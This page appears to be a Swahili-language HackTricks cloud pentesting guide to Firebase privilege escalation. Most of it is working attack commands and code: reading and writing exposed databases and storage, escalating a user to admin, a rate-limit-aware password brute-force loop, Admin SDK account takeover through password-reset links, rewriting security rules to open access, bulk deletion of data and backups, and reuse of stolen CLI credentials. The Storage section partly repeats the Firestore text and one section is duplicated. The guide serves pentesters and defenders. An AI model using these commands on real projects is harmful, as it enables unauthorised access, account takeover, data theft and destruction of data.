# GCP - Firebase Privesc

{{#include ../../../banners/hacktricks-training.md}}

## Firebase

### Ufikiaji bila uthibitisho wa Firebase Realtime Database
Mshambuliaji hahitaji ruhusa maalum za Firebase ili kutekeleza shambulio hili. Inahitaji tu kuwa na usanidi dhaifu katika kanuni za usalama za Firebase Realtime Database, ambapo kanuni zimetolewa kama `.read: true` au `.write: true`, zikiruhusu ufikiaji wa kusoma au kuandika kwa umma.

Mshambuliaji lazima atambue URL ya database, ambayo kwa kawaida inafuata muundo: `https://<project-id>.firebaseio.com/`.

URL hii inaweza kupatikana kupitia mobile application reverse engineering (decompiling Android APKs au analyzing iOS apps), kuchambua faili za usanidi kama google-services.json (Android) au GoogleService-Info.plist (iOS), kukagua source code ya web applications, au kuchunguza trafiki ya mtandao ili kutambua ombi kwa maeneo ya `*.firebaseio.com`.

Mshambuliaji humtambua URL ya database na kuangalia ikiwa ime wazi kwa umma, kisha hupata data na pengine kuandika taarifa zenye nia mbaya.

Kwanza, wanakagua ikiwa database inaruhusu ufikiaji wa kusoma kwa kuongeza `.json` kwenye URL.
```bash
curl https://<project-id>-default-rtdb.firebaseio.com/.json
```
Ikiwa jibu lina data ya JSON au null (badala ya "Permission Denied"), hifadhidata inaruhusu ufikiaji wa kusoma. Ili kuangalia ufikiaji wa kuandika, attacker anaweza kujaribu kutuma ombi la kuandika la majaribio kwa kutumia Firebase REST API.
```bash
curl -X PUT https://<project-id>-default-rtdb.firebaseio.com/test.json -d '{"test": "data"}'
```
Ikiwa operesheni itafanikiwa, hifadhidata pia inaruhusu ufikiaji wa kuandika.


### Ufichuzi wa data katika Cloud Firestore
Mshambuliaji hahitaji ruhusa maalum za Firebase ili kutekeleza shambulio hili. Inahitaji tu kwamba kuna usanidi wenye udhaifu katika kanuni za usalama za Cloud Firestore ambapo kanuni zinaruhusu ufikiaji wa kusoma au kuandika bila uthibitisho au kwa ukaguzi duni. Mfano wa kanuni iliyopangwa vibaya inayotoa ufikiaji kamili ni:
```bash
service cloud.firestore {
match /databases/{database}/documents/{document=**} {
allow read, write: if true;
}
}
```
Sheria hii inaruhusu mtu yeyote kusoma na kuandika nyaraka zote bila vikwazo vyovyote. Firestore rules ni za kina na zinatumika kwa kila collection na document, hivyo kosa katika rule maalum linaweza kufichua collections fulani pekee.

Mshambulizi lazima atambue Firebase Project ID, ambayo inaweza kupatikana kupitia mobile app reverse engineering, uchambuzi wa faili za usanidi kama google-services.json au GoogleService-Info.plist, ukaguzi wa source code wa web applications, au kuchambua trafiki ya mtandao ili kutambua requests kwa firestore.googleapis.com.
Firestore REST API inatumia muundo:
```bash
https://firestore.googleapis.com/v1/projects/<PROJECT_ID>/databases/(default)/documents/<collection>/<document>
```
Ikiwa kanuni zinaruhusu ufikiaji wa kusoma bila uthibitisho, mshambuliaji anaweza kusoma collections na documents. Kwanza, wanajaribu kufikia collection maalum:
```bash
curl https://firestore.googleapis.com/v1/projects/<PROJECT_ID>/databases/(default)/documents/<collection>
```
Ikiwa jibu lina nyaraka za JSON badala ya kosa la idhini, mkusanyo umefunuliwa. Mshambuliaji anaweza kuorodhesha makusanyo yote yanayofikika kwa kujaribu majina ya kawaida au kuchambua muundo wa programu. Ili kufikia nyaraka maalum:
```bash
curl https://firestore.googleapis.com/v1/projects/<PROJECT_ID>/databases/(default)/documents/<collection>/<document>
```
Ikiwa kanuni zinaruhusu unauthenticated write access au hazina ukaguzi wa kutosha, mshambuliaji anaweza kuunda nyaraka mpya:
```bash
curl -X POST https://firestore.googleapis.com/v1/projects/<PROJECT_ID>/databases/(default)/documents/<collection> \
-H "Content-Type: application/json" \
-d '{
"fields": {
"name": {"stringValue": "Test"},
"email": {"stringValue": "test@example.com"}
}
}'
```
Ili kubadilisha nyaraka iliyopo, tumia PATCH:
```bash
curl -X PATCH https://firestore.googleapis.com/v1/projects/<PROJECT_ID>/databases/(default)/documents/users/<user-id> \
-H "Content-Type: application/json" \
-d '{
"fields": {
"role": {"stringValue": "admin"}
}
}'
```
Ili kufuta hati na kusababisha kukatizwa kwa huduma:
```bash
curl -X DELETE https://firestore.googleapis.com/v1/projects/<PROJECT_ID>/databases/(default)/documents/<collection>/<document>
```
### Kufichuka kwa faili katika Firebase Storage
attacker hahitaji vibali maalum vya Firebase ili kufanya shambulio hili. Inahitaji tu kuwepo kwa configuration iliyo dhaifu katika Firebase Storage security rules ambapo rules zinakubali read au write access bila authentication au kwa validation isiyotosha. Storage rules zinadhibiti read na write permissions kando, hivyo kosa katika rule linaweza expose read access tu, write access tu, au zote mbili. Mfano wa rule iliyopangwa vibaya inayotoa full access ni:
```bash
service cloud.firestore {
match /databases/{database}/documents/{document=**} {
allow read, write: if true;
}
}
```
Kanuni hii inaruhusu ufikiaji wa kusoma na kuandika kwa documents zote bila vikwazo vyovyote. Firestore rules ni za kina na zinatumika kwa kila collection na kila document, hivyo kosa katika rule maalum linaweza kufichua collections fulani. Mshambuliaji lazima atambue Firebase Project ID, ambayo inaweza kupatikana kupitia mobile application reverse engineering, uchambuzi wa faili za konfigurasi kama google-services.json au GoogleService-Info.plist, inspection ya source code ya web application, au network traffic analysis ili kubaini requests kwa firestore.googleapis.com. Firestore REST API inatumia format:`https://firestore.googleapis.com/v1/projects/<PROJECT_ID>/databases/(default)/documents/<collection>/<document>.` Iwapo Firestore rules zinaruhusu ufikiaji wa kusoma bila uthibitisho, mshambuliaji anaweza kusoma collections na documents. Kwanza, anajaribu kufikia collection maalum.
```bash
curl "https://firebasestorage.googleapis.com/v0/b/<bucket>/o"
curl "https://firebasestorage.googleapis.com/v0/b/<bucket>/o?prefix=<path>"
```
Ikiwa jibu linaorodhesha faili badala ya hitilafu ya ruhusa, faili imefunuliwa. Mshambuliaji anaweza kuona yaliyomo ya faili kwa kubainisha njia yake:
```bash
curl "https://firebasestorage.googleapis.com/v0/b/<bucket>/o/<urlencode(path)>"
```
Kama sheria zinaruhusu ufikiaji wa kuandika bila uthibitisho au zinapokuwa na ukaguzi duni, mshambuliaji anaweza kupakia faili zenye madhara. Ili kupakia faili kupitia REST API:
```bash
curl -X POST "https://firebasestorage.googleapis.com/v0/b/<bucket>/o?name=<path>" \
-H "Content-Type: <content-type>" \
--data-binary @<local-file>
```
Mshambuliaji anaweza kupakia code shells, malware payloads, au faili kubwa ili kusababisha denial of service. Ikiwa programu inachakata au kutekeleza faili zilizopakiwa, mshambuliaji anaweza kupata remote code execution. Ili kufuta faili na kusababisha denial of service:
```bash
curl -X DELETE "https://firebasestorage.googleapis.com/v0/b/<bucket>/o/<path>"
```
### Uitishaji wa Firebase Cloud Functions za umma
Mshambuliaji hahitaji ruhusa maalum za Firebase ili exploit tatizo hili; inahitaji tu kwamba Cloud Function inapatikana kwa umma kupitia HTTP bila authentication.

Function iko hatarini wakati imesanidiwa kwa usalama hafifu:

- Inatumia functions.https.onRequest, ambayo haisi kuanzisha authentication (tofa tofauti na onCall functions).
- Msimbo wa function hautathibitishi user authentication (kwa mfano, hakuna ukaguzi wa request.auth au context.auth).
- Function inapatikana kwa umma katika IAM, ikimaanisha allUsers ina roles/cloudfunctions.invoker role. Hii ni tabia ya chaguo-msingi kwa HTTP functions isipokuwa developer atakayemzuia ufikiaji.

Firebase HTTP Cloud Functions zinaonyeshwa kupitia URLs kama:

- `https://<region>-<project-id>.cloudfunctions.net/<function-name>`
- `https://<project-id>.web.app/<function-name>` (when integrated with Firebase Hosting)

Mshambuliaji anaweza kugundua URL hizi kupitia uchambuzi wa source code, ukaguzi wa network traffic, zana za enumeration, au reverse engineering ya mobile app.
Ikiwa function imeonyeshwa kwa umma na bila authentication, mshambuliaji anaweza kuitisha moja kwa moja bila credentials.
```bash
# Invoke public HTTP function with GET
curl "https://<region>-<project-id>.cloudfunctions.net/<function-name>"
# Invoke public HTTP function with POST and data
curl -X POST "https://<region>-<project-id>.cloudfunctions.net/<function-name>" \
-H "Content-Type: application/json" \
-d '{"param1": "value1", "param2": "value2"}'
```
Ikiwa function haisahihi kuthibitisha viingilio ipasavyo, mshambuliaji anaweza kujaribu mashambulizi mengine kama code injection au command injection.


### Brute-force attack dhidi ya Firebase Authentication kwa sera ya nywila dhaifu
Mshambuliaji hahitaji ruhusa maalum za Firebase kutekeleza shambulio hili. Inahitaji tu kwamba Firebase API Key imefunuliwa katika programu za simu au programu za wavuti, na kwamba sera ya nywila haijasanidiwa kwa mahitaji mkali zaidi kuliko chaguo-msingi.

Mshambuliaji lazima aitambue Firebase API Key, ambayo inaweza kupatikana kupitia mobile app reverse engineering, uchambuzi wa faili za usanidi kama google-services.json au GoogleService-Info.plist, kukagua source code ya web applications (kwa mfano, katika bootstrap.js), au kuchambua trafiki ya mtandao.

REST API ya Firebase Authentication inatumia endpoint:
`https://identitytoolkit.googleapis.com/v1/accounts:signInWithPassword?key=<API_KEY>`
kuthibitisha kwa email na password.

Ikiwa Email Enumeration Protection imezimwa, majibu ya makosa ya API yanaweza kufichua ikiwa barua pepe ipo katika mfumo (EMAIL_NOT_FOUND vs. INVALID_PASSWORD), ambayo inawawezesha mshambuliaji kuorodhesha watumiaji kabla ya kujaribu kubashiri nywila. Wakati ulinzi huu umewezeshwa, API inarudisha ujumbe wa makosa ule ule kwa barua pepe zisizopo na kwa nywila zisizo sahihi, ikizuia uorodheshaji wa watumiaji.

Ni muhimu kutambua kwamba Firebase Authentication inatekeleza rate limiting, ambayo inaweza kuzuia maombi ikiwa majaribio mengi ya uthibitisho yanatokea kwa muda mfupi. Kwa sababu hii, mshambuliaji atabidi aweke ucheleweshaji kati ya majaribio ili kuepuka kuwekwa kwenye rate limit.

Mshambuliaji anaitambua API Key na kufanya majaribio ya uthibitisho kwa nywila nyingi dhidi ya akaunti zinazojulikana. Ikiwa Email Enumeration Protection imezimwa, mshambuliaji anaweza kuorodhesha watumiaji waliopo kwa kuchambua majibu ya makosa:
```bash
# Attempt authentication with a known email and an incorrect password
curl -X POST "https://identitytoolkit.googleapis.com/v1/accounts:signInWithPassword?key=<API_KEY>" \
-H "Content-Type: application/json" \
-d '{
"email": "usuario@example.com",
"password": "password",
"returnSecureToken": true
}'
```
Ikiwa jibu lina EMAIL_NOT_FOUND, barua pepe haipo katika mfumo. Ikiwa lina INVALID_PASSWORD, barua pepe ipo lakini nenosiri sio sahihi, ikithibitisha kwamba mtumiaji amejiandikisha. Mara mtumiaji halali anapotambuliwa, mshambuliaji anaweza kufanya jaribio za brute-force. Ni muhimu kujumuisha mapumziko kati ya majaribio ili kuepuka Firebase Authentication’s rate-limiting mechanisms:
```bash
counter=1
for password in $(cat wordlist.txt); do
echo "Intento $counter: probando contraseña '$password'"
response=$(curl -s -X POST "https://identitytoolkit.googleapis.com/v1/accounts:signInWithPassword?key=<API_KEY>" \
-H "Content-Type: application/json" \
-d "{\"email\":\"usuario@example.com\",\"password\":\"$password\",\"returnSecureToken\":true}")

if echo "$response" | grep -q "idToken"; then
echo "Contraseña encontrada: $password (intento $counter)"
break
fi

# Stop for the rate limiting
sleep 1
counter=$((counter + 1))
done
```
Kwa sera ya nywila ya chaguo-msingi (ya angalau herufi 6, hakuna mahitaji ya ugumu), mshambulizi anaweza kujaribu mchanganyiko wote unaowezekana wa nywila za herufi 6, ambayo inawakilisha nafasi ndogo ya utafutaji ikilinganishwa na sera kali zaidi za nywila.

### Usimamizi wa watumiaji katika Firebase Authentication

Mshambulizi anahitaji idhini maalum za Firebase Authentication ili kutekeleza shambulio hili. Idhini zinazohitajika ni:

- `firebaseauth.users.create` to create users
- `firebaseauth.users.update` to modify existing users
- `firebaseauth.users.delete` to delete users
- `firebaseauth.users.get` to retrieve user information
- `firebaseauth.users.sendEmail` to send emails to users
- `firebaseauth.users.createSession` to create user sessions

These permissions are included in the `roles/firebaseauth.admin` role, which grants full read/write access to Firebase Authentication resources. They are also included in higher-level roles such as roles/firebase.developAdmin (which includes all firebaseauth.* permissions) and roles/firebase.admin (full access to all Firebase services).

Ili kutumia Firebase Admin SDK, mshambulizi atahitaji kufikia kredenshiali za akaunti ya huduma (faili la JSON), ambazo zinaweza kupatikana kwenye mifumo iliyovamiwa, repositories za code zilizo wazi hadharani, mifumo ya CI/CD iliyovamiwa, au kupitia uvamizi wa akaunti za watengenezaji ambazo zina ufikiaji wa kredenshiali hizi.

Hatua ya kwanza ni kusanidi Firebase Admin SDK kwa kutumia kredenshiali za akaunti ya huduma.
```bash
import firebase_admin
from firebase_admin import credentials, auth
cred = credentials.Certificate('path/to/serviceAccountKey.json')
firebase_admin.initialize_app(cred)
```
Ili kuunda mtumiaji mbaya kwa kutumia anwani ya barua pepe ya mwathiriwa, mshambuliaji angejaribu kutumia Firebase Admin SDK kuunda akaunti mpya kwa anwani hiyo.
```bash
user = auth.create_user(
email='victima@example.com',
email_verified=False,
password='password123',
display_name='Usuario Malicioso',
disabled=False
)
print(f'Usuario creado: {user.uid}')
```
Ili kubadilisha mtumiaji aliyepo, attacker angesasisha maeneo kama anwani ya barua pepe, hali ya uthibitisho, au ikiwa akaunti imezimwa.
```bash
user = auth.update_user(
uid,
email='nuevo-email@example.com',
email_verified=True,
disabled=False
)
print(f'Usuario actualizado: {user.uid}')
```
Ili kufuta akaunti ya mtumiaji na kusababisha denial of service, the attacker angewasilisha ombi la kufuta akaunti ya mtumiaji kabisa.
```bash
auth.delete_user(uid)
print('Usuario eliminado exitosamente')
```
Mshambuliaji pia anaweza kupata taarifa kuhusu watumiaji waliopo kwa kuomba UID zao au email address.
```bash
user = auth.get_user(uid)
print(f'Información del usuario: {user.uid}, {user.email}')
user = auth.get_user_by_email('usuario@example.com')
print(f'Información del usuario: {user.uid}, {user.email}')
```
Zaidi ya hayo, mshambuliaji anaweza kuunda viungo vya uthibitisho au viungo vya urejeshaji wa nenosiri ili kubadilisha nenosiri la mtumiaji na kupata ufikiaji wa akaunti yake.
```bash
link = auth.generate_email_verification_link(email)
print(f'Link de verificación: {link}')
link = auth.generate_password_reset_link(email)
print(f'Link de reset: {link}')
```
### Usimamizi wa watumiaji katika Firebase Authentication
Mshambuliwa anahitaji ruhusa maalum za Firebase Authentication ili kufanya shambulio hili. Ruhusa zinazohitajika ni:

- `firebaseauth.users.create` ili kuunda watumiaji
- `firebaseauth.users.update` ili kubadilisha watumiaji waliopo
- `firebaseauth.users.delete` ili kufuta watumiaji
- `firebaseauth.users.get` kupata taarifa za watumiaji
- `firebaseauth.users.sendEmail` kutuma barua pepe kwa watumiaji
- `firebaseauth.users.createSession` kuunda vikao vya watumiaji

Ruhusa hizi zipo katika jukumu roles/firebaseauth.admin, ambalo linatoa ufikivu kamili wa kusoma/kuandika kwa rasilimali za Firebase Authentication. Pia ni sehemu ya majukumu ya ngazi ya juu kama `roles/firebase.developAdmin` (linalojumuisha ruhusa zote firebaseauth.*) na `roles/firebase.admin` (ufikivu kamili kwa huduma zote za Firebase).

Ili kutumia Firebase Admin SDK, mshambuliwa atahitaji ufikiaji wa cheti za akaunti ya huduma (faili ya JSON), ambacho kinaweza kupatikana kutoka kwa mifumo iliyodukuliwa, hifadhi za kanuni zilizo wazi hadharani, mazingira yaliyodukuliwa ya CI/CD, au kupitia udukaji wa akaunti za watengenezaji zilizo na ufikiaji wa vyeti hivi.

Hatua ya kwanza ni kusanidi Firebase Admin SDK kwa kutumia cheti za akaunti ya huduma.
```bash
import firebase_admin
from firebase_admin import credentials, auth
cred = credentials.Certificate('path/to/serviceAccountKey.json')
firebase_admin.initialize_app(cred)
```
Ili kuunda mtumiaji mbaya kwa kutumia barua pepe ya mwathiriwa, mshambuliaji angejaribu kuunda akaunti mpya ya mtumiaji kwa barua pepe hiyo, akiweka neno la siri lake mwenyewe na taarifa za wasifu.
```bash
user = auth.create_user(
email='victima@example.com',
email_verified=False,
password='password123',
display_name='Usuario Malicioso',
disabled=False
)
print(f'Usuario creado: {user.uid}')
```
Ili kubadilisha mtumiaji aliyepo, mshambulizi angebadilisha sehemu kama anwani ya barua pepe, hali ya uthibitisho, au kama akaunti imezimwa.
```bash
user = auth.update_user(
uid,
email='nuevo-email@example.com',
email_verified=True,
disabled=False
)
print(f'Usuario actualizado: {user.uid}')
```
Ili kufuta akaunti ya mtumiaji—kwa ufanisi kusababisha denial of service—mshambuliaji angefanya ombi la kumwondoa mtumiaji huyo kwa kudumu.
```bash
auth.delete_user(uid)
print('Usuario eliminado exitosamente')
```
Mshambuliaji pia angeweza kupata taarifa kuhusu watumiaji waliopo, kama UID au email yao, kwa kuomba maelezo ya mtumiaji kwa UID au kwa anwani ya email.
```bash
user = auth.get_user(uid)
print(f'Información del usuario: {user.uid}, {user.email}')
user = auth.get_user_by_email('usuario@example.com')
print(f'Información del usuario: {user.uid}, {user.email}')
```
Zaidi ya hayo, mshambuliaji anaweza kutengeneza verification links au password-reset links, na hivyo kuwawezesha kubadilisha nenosiri la mtumiaji na kuchukua udhibiti wa akaunti.
```bash
link = auth.generate_email_verification_link(email)
print(f'Link de verificación: {link}')
link = auth.generate_password_reset_link(email)
print(f'Link de reset: {link}')
```
### Ubadilishaji wa sheria za usalama katika huduma za Firebase
Mshambuliaji anahitaji ruhusa maalum kubadilisha sheria za usalama kulingana na huduma. Kwa Cloud Firestore na Firebase Cloud Storage, ruhusa zinazohitajika ni `firebaserules.rulesets.create` ili kuunda seti za sheria na `firebaserules.releases.create` ili kuzindua matoleo. Ruhusa hizi ziko katika jukumu la `roles/firebaserules.admin` au katika majukumu ya ngazi ya juu kama `roles/firebase.developAdmin` na `roles/firebase.admin`. Kwa Firebase Realtime Database, ruhusa inayohitajika ni `firebasedatabase.instances.update`.

Mshambuliaji lazima atumie Firebase REST API kubadilisha sheria za usalama. Kwanza, mshambuliaji atahitaji kupata tokeni ya ufikiaji kwa kutumia cheti cha akaunti ya huduma. Ili kupata tokeni:
```bash
gcloud auth activate-service-account --key-file=path/to/serviceAccountKey.json
ACCESS_TOKEN=$(gcloud auth print-access-token)
```
Ili kubadilisha kanuni za Firebase Realtime Database:
```bash
curl -X PUT "https://<project-id>-default-rtdb.firebaseio.com/.settings/rules.json?access_token=$ACCESS_TOKEN" \
-H "Content-Type: application/json" \
-d '{
"rules": {
".read": true,
".write": true
}
}'
```
Ili kubadilisha Cloud Firestore rules, mshambuliaji lazima aunde ruleset kisha aitekeleze:
```bash
curl -X POST "https://firebaserules.googleapis.com/v1/projects/<project-id>/rulesets" \
-H "Authorization: Bearer $ACCESS_TOKEN" \
-H "Content-Type: application/json" \
-d '{
"source": {
"files": [{
"name": "firestore.rules",
"content": "rules_version = '\''2'\'';\nservice cloud.firestore {\n  match /databases/{database}/documents {\n    match /{document=**} {\n      allow read, write: if true;\n    }\n  }\n}"
}]
}
}'
```
Amri iliyotangulia inarudisha jina la ruleset kwa muundo projects/<project-id>/rulesets/<ruleset-id>. Ili kupeleka toleo jipya, release lazima isasishwe kwa kutumia PATCH request:
```bash
curl -X PATCH "https://firebaserules.googleapis.com/v1/projects/<project-id>/releases/cloud.firestore" \
-H "Authorization: Bearer $ACCESS_TOKEN" \
-H "Content-Type: application/json" \
-d '{
"release": {
"name": "projects/<project-id>/releases/cloud.firestore",
"rulesetName": "projects/<project-id>/rulesets/<ruleset-id>"
}
}'
```
Ili kubadilisha sheria za Firebase Cloud Storage:
```bash
curl -X POST "https://firebaserules.googleapis.com/v1/projects/<project-id>/rulesets" \
-H "Authorization: Bearer $ACCESS_TOKEN" \
-H "Content-Type: application/json" \
-d '{
"source": {
"files": [{
"name": "storage.rules",
"content": "service firebase.storage {\n  match /b/{bucket}/o {\n    match /{allPaths=**} {\n      allow read, write: if true;\n    }\n  }\n}"
}]
}
}'
```
Amri iliyotangulia inarudisha jina la ruleset katika muundo projects/<project-id>/rulesets/<ruleset-id>. Ili kupeleka toleo jipya, release lazima isasishwe kwa kutumia ombi la PATCH:
```bash
curl -X PATCH "https://firebaserules.googleapis.com/v1/projects/<project-id>/releases/firebase.storage/<bucket-id>" \
-H "Authorization: Bearer $ACCESS_TOKEN" \
-H "Content-Type: application/json" \
-d '{
"release": {
"name": "projects/<project-id>/releases/firebase.storage/<bucket-id>",
"rulesetName": "projects/<project-id>/rulesets/<ruleset-id>"
}
}'
```
### Data exfiltration and manipulation in Cloud Firestore
Cloud Firestore inatumia miundombinu na mfumo wa ruhusa sawa na Cloud Datastore, hivyo ruhusa za Datastore IAM zinatumika moja kwa moja kwa Firestore. Ili kuhariri sera za TTL, ruhusa ya `datastore.indexes.update` inahitajika. Ili kusafirisha data, ruhusa ya `datastore.databases.export` inahitajika. Ili kuingiza data, ruhusa ya datastore.databases.import inahitajika. Ili kufanya ufutaji mkubwa wa data, ruhusa ya `datastore.databases.bulkDelete` inahitajika.

Kwa shughuli za chelezo na urejeshaji, ruhusa maalum zinahitajika:

- `datastore.backups.get` na `datastore.backups.list` ili kuorodhesha na kupata maelezo ya chelezo zilizopo
- `datastore.backups.delete` ili kufuta chelezo
- `datastore.backups.restoreDatabase` ili kurejesha database kutoka chelezo
- `datastore.backupSchedules.create` na `datastore.backupSchedules.delete` kusimamia ratiba za chelezo

Unapounda sera ya TTL, mali maalum inachaguliwa kutambua entiti ambazo zinastahili kufutwa. Mali hii ya TTL lazima iwe ya aina ya tarehe na wakati (Date and time type). The attacker anaweza kuchagua mali ambayo tayari ipo au kuainisha mali watakayopanga kuongeza baadaye. Ikiwa thamani ya uwanja ni tarehe ya zamani, document inakuwa inastahili kufutwa mara moja. The attacker anaweza kutumia gcloud CLI kuendesha mabadiliko ya sera za TTL.
```bash
# Enable TTL
gcloud firestore fields ttls update expireAt \
--collection-group=users \
--enable-ttl
# Disable TTL
gcloud firestore fields ttls update expireAt \
--collection-group=users \
--disable-ttl
```
Ili kuhamisha data na ku-exfiltrate, mshambuliaji angeweza kutumia gcloud CLI.
```bash
gcloud firestore export gs://<bucket-name> --project=<project-id> --async --database='(default)'
```
Ili kuingiza data hasidi:
```bash
gcloud firestore import gs://<bucket-name>/<path> --project=<project-id> --async --database='(default)'
```
Ili kufuta data kwa wingi na kusababisha denial of service, mshambuliaji anaweza kutumia gcloud Firestore bulk-delete tool kuondoa collections zote.
```bash
gcloud firestore bulk-delete \
--collection-ids=users,posts,messages \
--database='(default)' \
--project=<project-id>
```
Kwa operesheni za backup na urejeshaji, mshambulizi anaweza kuunda scheduled backups ili kunasa hali ya sasa ya database, kuorodhesha existing backups, kurejesha kutoka kwenye backup ili kuandika juu ya mabadiliko ya hivi karibuni, kufuta backups ili kusababisha upotevu wa data wa kudumu, na kuondoa scheduled backups.
Kuunda daily backup schedule ambayo inaanza mara moja kutoa backup:
```bash
gcloud firestore backups schedules create \
--database='(default)' \
--recurrence=daily \
--retention=14w \
--project=<project-id>
```
Ili kurejesha kutoka kwenye chelezo maalum, mshambuliaji anaweza kuunda database mpya akitumia data iliyomo kwenye chelezo hicho. Operesheni ya kurejesha inaandika data ya chelezo kwenye database mpya, ikimaanisha kwamba DATABASE_ID iliyopo haiwezi kutumika.
```bash
gcloud firestore databases restore \
--source-backup=projects/<project-id>/locations/<location>/backups/<backup-id> \
--destination-database='<new-database-id>' \
--project=<project-id>
```
Ili kufuta backup na kusababisha kupoteza data kwa kudumu:
```bash
gcloud firestore backups delete \
--backup=<backup-id> \
--project=<project-id>
```
### Uibiwa na matumizi mabaya ya Firebase CLI credentials
Mshambuliaji haahitaji ruhusa maalum za Firebase kutekeleza shambulio hili, lakini anahitaji kupata ufikiaji wa kompyuta ya muendelezaji au faili ya Firebase CLI credentials. Credentials hizi zimehifadhiwa kwenye faili la JSON linalopatikana katika:

- Linux/macOS: ~/.config/configstore/firebase-tools.json

- Windows: C:\Users\[User]\.config\configstore\firebase-tools.json

Faili hili lina authentication tokens, ikiwa ni pamoja na refresh_token na access_token, ambazo zinamruhusu mshambuliaji kujithibitisha kama mtumiaji aliyewahi kuendesha firebase login.

Mshambuliaji anapata ufikiaji wa faili ya Firebase CLI credentials. Kisha wanaweza kunakili faili nzima kwenye mfumo wao, na Firebase CLI itatumia kwa moja kwa moja credentials kutoka mahali pa chaguo-msingi. Baada ya kufanya hivyo, mshambuliaji anaweza kuona miradi yote ya Firebase inayofikika kwa mtumiaji huyo.
```bash
firebase projects:list
```
{{#include ../../../banners/hacktricks-training.md}}
